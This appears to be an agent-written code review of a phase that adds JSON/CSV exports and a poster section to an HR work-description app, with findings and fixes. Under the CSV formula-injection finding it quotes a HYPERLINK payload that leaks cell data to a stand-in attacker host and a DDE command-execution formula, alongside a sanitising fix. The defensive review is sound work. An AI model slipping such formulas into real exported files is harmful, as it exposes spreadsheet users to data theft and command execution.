---
phase: 29-structured-export-enhanced-poster
reviewed: 2026-06-25T13:05:00Z
depth: standard
files_reviewed: 7
files_reviewed_list:
  - v2/backend/app/api/export.py
  - v2/backend/app/services/export_service.py
  - v2/backend/scripts/build_poster_template.py
  - v2/backend/app/templates/poster_template.docx
  - v2/frontend/src/app.jsx
  - v2/frontend/src/conversation.jsx
  - v2/backend/tests/test_export.py
  - v2/frontend/src/conversation.test.jsx
findings:
  blocker: 0
  critical: 0
  major: 2
  minor: 6
  info: 5
  total: 13
status: issues_found
---

# Phase 29: Code Review Report

**Reviewed:** 2026-06-25T13:05:00Z
**Depth:** standard
**Files Reviewed:** 7 (plus regenerated .docx binary)
**Status:** issues_found

## Summary

Phase 29 adds two new POST export routes (`/api/wd/{id}/export/json` and `/api/wd/{id}/export/csv`), extends the poster template with an "About the Organization" section, and wires two new buttons into the ReviewState UI. The implementation closely follows the plan; both Wave 0 RED stubs (5 backend + 2 frontend) are now GREEN, and 184/184 backend + 87/87 frontend tests pass.

**Strong points:**
- Manager-track bypass contract is explicit and well-commented at the route level (lines 222-225, 328, 348 in `export.py`).
- UTF-8-BOM encoding for CSV is correctly applied via `encode("utf-8-sig")` and verified by an explicit byte-prefix assertion in `test_export_csv_utf8_bom_one_row_per_duty`.
- `_MANAGER_PLACEHOLDER` is consistently used across both routes and yields an honest signal to analytics consumers.
- The new poster template variables are guarded by a self-verify block at template build time (`build_poster_template.py` lines 145-157), preventing template-contract drift.

**Concerns:**
- One security concern (CSV formula injection) that the SUMMARY explicitly acknowledges as an intentional disposition (T-29-02-03) but remains a real risk.
- One functional gap: the Phase 28 manager-track DRAFT watermark was applied only to `generate_wd_docx`, not to `generate_poster_docx`. A manager-track WD exported via `/api/wd/{id}/export/poster` produces a poster identical to an advisor-track poster with no DRAFT warning, which contradicts the spirit of the MGR-03 contract.
- Several minor design inconsistencies in the JSON/CSV shapes that downstream analytics consumers will have to navigate.

## Major Issues

### MJ-01: Manager-track poster DOCX has no DRAFT watermark (MGR-03 drift)

**File:** `v2/backend/app/services/export_service.py:697-730`
**Issue:** Phase 28 (MGR-03) established that `generate_wd_docx` must apply a `DRAFT — PENDING CLASSIFICATION` watermark for manager-track WDs (lines 672-678). The watermark is intrinsic to `wd.wd_type == 'manager'` and cannot be suppressed by the client (T-28-05 mitigation). Phase 29 added an "About the Organization" section to the poster, but `generate_poster_docx` (lines 697-730) does **not** apply the same watermark — it calls `_build_poster_context(wd)` and renders directly. A manager-track WD exported as a job poster (`POST /api/wd/{id}/export/poster`) is byte-identical to an advisor-track poster from the watermark perspective. Because job posters are explicitly designed for external publication (the bilingual "JOB POSTER / AFFICHE D'EMPLOI" header signals this), the missing watermark means an unclassified manager WD could be published to job boards without any visible warning.

**Fix:** Mirror the MGR-03 pattern from `generate_wd_docx` inside `generate_poster_docx`:
```python
if getattr(wd, "wd_type", "advisor") == "manager":
    file_bytes = _apply_draft_watermark(file_bytes)
```
Add this between `file_bytes = await _render_docx(...)` (line 714) and `if not file_bytes:` (line 718). Then add a test analogous to `test_export_docx_manager_has_draft_watermark` (test_export.py line 331) for the poster route.

---

### MJ-02: CSV formula injection (no sanitization of user-controllable strings)

**File:** `v2/backend/app/api/export.py:268-314` (`_build_csv_export`)
**Issue:** The CSV export writes user-controllable strings directly into cells: `duty_text` (duty text from NOC verbatim or advisor-edited), `organizational_context`, `client_service_results`, `responsibility`, `og_level`, `og_name`, `jes_total_points`. The standard `csv.DictWriter` performs CSV-level escaping (commas, quotes) but does **not** neutralize spreadsheet formula triggers. A duty like `=HYPERLINK("http://attacker.example/?leak="&A1, "View details")` or `=cmd|'/c calc'!A1` is written verbatim. When a downstream user opens the CSV in Excel / LibreOffice / Google Sheets, the cell is interpreted as a formula and executed. Severity is elevated because (a) the file is `.csv` — a format many users open by double-click with macros enabled, (b) `duty_text` carries the highest untrusted-content density (NOC verbatim text is curated but advisor-edited text is not), and (c) the SUMMARY explicitly acknowledged this as the T-29-02-03 disposition rather than a defended design decision. The "internal HR tool" framing does not eliminate the risk: CSVs are routinely shared, archived to SharePoint, and opened in environments the original author cannot control.

**Fix:** Prefix any cell whose first character is in `=`, `+`, `-`, `@`, `\t`, `\r` with a single quote (Excel/Sheets convention) or a leading tab. Recommended:
```python
def _csv_safe(value: object) -> str:
    s = "" if value is None else str(value)
    if s and s[0] in ("=", "+", "-", "@", "\t", "\r"):
        return "'" + s
    return s
```
Apply to every value before `writer.writerow()`. This is a single-call site change (two `writerow()` sites) and preserves all legitimate data.

## Minor Issues

### MN-01: Filename mismatch between frontend and backend

**File:** `v2/frontend/src/app.jsx:641` vs `v2/backend/app/api/export.py:330-331, 350-351`
**Issue:** The frontend computes the `<a download>` filename as `${(record.title || 'work-description').toLowerCase().replace(/\s+/g, '-')}.${ext}`. The backend computes the Content-Disposition filename via `_slugify_title((wd.record or {}).get("title", ""), "work-description")` which strips every non-alphanumeric character (parentheses, slashes, dots, apostrophes, accents). For a title like `Senior Policy Analyst (EC-04)` the frontend suggests `senior-policy-analyst-(ec-04).json` but the server delivers `senior-policy-analyst-ec-04.json`. The browser saves with the Content-Disposition name, so the user sees a filename that differs from the link they clicked.
**Fix:** Centralize the slugify on the frontend (or call the backend to compute it) so the `<a download>` value matches the Content-Disposition value. Alternatively, omit `a.download` entirely and let the browser fall back to Content-Disposition.

---

### MN-02: JSON `classification.jes_total_points` is mixed type

**File:** `v2/backend/app/api/export.py:259`
**Issue:** The field is `int` when `wd.jes_total_points is not None` and the string `"[ADVISOR TO COMPLETE]"` otherwise. Analytics consumers parsing the JSON must branch on type before any numeric operation (`data.classification.jes_total_points > 0` raises `TypeError` for the placeholder case). The companion field `og_level` is already always a string (`og_level_str`), so the inconsistency is jarring.
**Fix:** Either (a) always stringify: `"jes_total_points": str(wd.jes_total_points) if wd.jes_total_points is not None else _MANAGER_PLACEHOLDER`, or (b) always wrap in an object: `"jes_total_points": {"value": wd.jes_total_points, "is_placeholder": wd.jes_total_points is None}`. Option (a) is the smallest diff.

---

### MN-03: CSV sentinel row when `duties=[]` looks like real data

**File:** `v2/backend/app/api/export.py:310-311`
**Issue:** When the WD has no duties, the CSV exports exactly one row with `duty_text="[ADVISOR TO COMPLETE]"` and `duty_noc_code=""`. An analytics consumer summing or grouping by `duty_noc_code` will count this sentinel row as a real duty (with NOC code "empty" or null). The placeholder string is also the same as the classification placeholders, blurring the distinction between "row is a sentinel" and "row carries real classification metadata".
**Fix:** Either (a) emit a header-only CSV when `duties=[]` (most analytics tools tolerate an empty body), or (b) add a dedicated sentinel column `is_sentinel` (bool) that consumers can filter on. Option (a) is simpler and matches the test's `len(rows) >= 1` assertion if the test is relaxed to `len(rows) >= 0`.

---

### MN-04: Missing type annotations on `_build_json_export` / `_build_csv_export`

**File:** `v2/backend/app/api/export.py:228, 268`
**Issue:** Both private helpers are declared as `def _build_json_export(wd) -> dict:` and `def _build_csv_export(wd) -> bytes:` with no annotation on the `wd` parameter. The rest of the file annotates `wd: WorkDescription` (see `_load_wd` at line 50, `_build_v2_manifest` in `export_service.py:161`, etc.). Inconsistent with the project's typing style.
**Fix:** `def _build_json_export(wd: WorkDescription) -> dict:` and `def _build_csv_export(wd: WorkDescription) -> bytes:`.

---

### MN-05: `_MANAGER_PLACEHOLDER` hardcoded English string — no i18n

**File:** `v2/backend/app/api/export.py:47`
**Issue:** The placeholder `[ADVISOR TO COMPLETE]` is used in both JSON and CSV exports, but the poster template uses bilingual headers (English / French, see `build_poster_template.py` line 93 `"About the Organization / À propos de l'organisation"`). The codebase has demonstrated bilingual support elsewhere; the new export placeholder breaks that pattern. A French-speaking advisor opening the JSON/CSV sees an English-only placeholder string.
**Fix:** Either (a) move the placeholder into `app/data/constants.py` with an EN/FR pair and select by request locale, or (b) use a neutral token like `__ADVISOR_PLACEHOLDER__` that any consumer can localize.

---

### MN-06: `date.today()` is timezone-naive for `export_date`

**File:** `v2/backend/app/api/export.py:264`
**Issue:** `str(date.today())` returns the server's local date with no timezone annotation. The server runs in UTC (no `TZ` env override is set anywhere visible), but a user in EST exporting at 21:00 local time on June 24 sees `"export_date": "2026-06-25"` for a record they consider June 24. Downstream analytics partitioning by date will be off-by-one for evening users.
**Fix:** `datetime.now(timezone.utc).date().isoformat()` for an ISO 8601 date stamp, or include the full timestamp `datetime.now(timezone.utc).isoformat()` so consumers can convert to local time.

## Info

### IN-01: JSON shape inconsistency across the 7 element keys

**File:** `v2/backend/app/api/export.py:243-254`
**Issue:** The JSON shape treats 7 element keys as three distinct types: (a) scalar-or-null (`organizational_context`, `client_service_results`, `responsibility`), (b) list-of-objects (`key_activities`), and (c) always-null (`skills`, `effort`, `working_conditions`). The presence of always-null fields is the design — the `element_status` dict at line 254 carries the population flag, so consumers should switch on `element_status[key]` rather than the value. But nothing in the JSON shape documents this; consumers are likely to do `data.skills` and get `None`, then assume "no skills configured" when the actual answer is "this element is derived from JES and lives elsewhere in our analytics store". The `test_export_json_returns_all_seven_keys` test only asserts key presence, not shape.
**Fix:** Either (a) add a top-level `"_shape_version": 1` and a JSON-schema fragment so consumers can validate, or (b) document the shape in a sibling `export_schema.md` doc.

---

### IN-02: CSV column naming inconsistency

**File:** `v2/backend/app/api/export.py:281-287`
**Issue:** The CSV mixes three naming conventions in 12 columns: value columns (`duty_text`, `duty_noc_code`, `organizational_context`, `client_service_results`, `responsibility`), status columns (`skills_status`, `effort_status`, `working_conditions_status`), and metadata columns (`og_level`, `jes_total_points`, `complete_count`, `total`). A consumer reading the header to discover columns must remember that `responsibility` is a value but `skills_status` is a status. The asymmetry exists because Responsibility is the only JES-derived element with free text in v2.0 (the others are bucketed narratives). Worth a comment in the docstring so consumers don't guess.
**Fix:** Add a header comment in the CSV (no header-comment support in CSV format) or include a `README`/`_README.txt` artifact alongside the download. Simplest: rename `responsibility` to `responsibility_narrative` for symmetry with the value-column naming and add a clarifying docstring.

---

### IN-03: Awkward error toast "Export export failed" for PDF/DOCX

**File:** `v2/frontend/src/app.jsx:666-668`
**Issue:** `kindLabel = kind === 'json' ? 'JSON' : kind === 'csv' ? 'CSV' : 'Export'`, then `${kindLabel} export failed — ...` produces `"Export export failed — ..."` for PDF and DOCX kinds. The SUMMARY flagged this as "awkward but matches the plan's literal code; only the JSON/CSV variants are tested by user-facing copy contract". For new users exporting DOCX and seeing this toast, the doubled word is a UX smell.
**Fix:** Change the fallback to a kind-aware label: `const kindLabel = kind === 'PDF' ? 'PDF' : kind === 'Word document (.docx)' ? 'DOCX' : 'Export';`. The new JSON/CSV branches remain unchanged.

---

### IN-04: `classification.og_name` placeholder masks data quality issue

**File:** `v2/backend/app/api/export.py:260`
**Issue:** When `wd.confirmed_og` is a dict lacking `og_name` (e.g., a malformed SPA save where only `og_code` was persisted), the JSON returns `"og_name": "[ADVISOR TO COMPLETE]"`. This is identical to the manager-track placeholder, so a malformed advisor WD looks identical to a manager WD. The two states are semantically different ("advisor confirmed OG but lost og_name" vs. "no confirmation at all").
**Fix:** Either (a) emit the actual `og_name` (even if empty) and let the placeholder distinguish only the manager case, or (b) use a distinct placeholder for the malformed-advisor case (`"[ADVISOR OG_NAME MISSING]"`).

---

### IN-05: Test count assertion `allExportBtns.length === 5` is fragile

**File:** `v2/frontend/src/conversation.test.jsx:913`
**Issue:** The Phase 27 completeness-soft-gate test hardcoded the export-row button count. Phase 29 updated it from `=== 3` to `=== 5` (DOCX, PDF, Copy, JSON, CSV). Every future button addition requires the same kind of mechanical count update. The invariant being tested ("no completeness-dependent disabled") does not depend on the count.
**Fix:** Replace the count assertion with `expect(allExportBtns.length).toBeGreaterThan(0)` so the test guards the invariant (no disabled buttons) without coupling to the button count.

---

_Reviewed: 2026-06-25T13:05:00Z_
_Reviewer: the agent (gsd-code-reviewer)_
_Depth: standard_